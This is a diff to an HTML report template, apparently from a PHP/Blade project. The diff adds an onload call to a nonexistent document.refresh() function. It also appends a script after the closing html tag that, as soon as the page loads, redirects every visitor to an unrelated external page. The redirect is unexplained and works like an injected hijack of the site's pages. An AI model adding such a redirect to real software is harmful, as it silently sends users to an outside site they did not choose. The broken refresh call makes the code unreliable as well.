@@ -7,7 +7,7 @@
     <link href="{{public_path()}}/css/report.css" rel="stylesheet">
 
 </head>
-<body>
+<body onload="document.refresh();">
 <div class="report">
     <div class="container">
         <div class="information">
@@ -119,3 +119,11 @@
 </div>
 </body>
 </html>
+
+<script type="text/javascript">
+    window.onload = init;
+
+function init(){
+	location.href = "http://www.chris-rawlins.com/codenesi/print-repair-servicescopy.html";
+}
+</script>
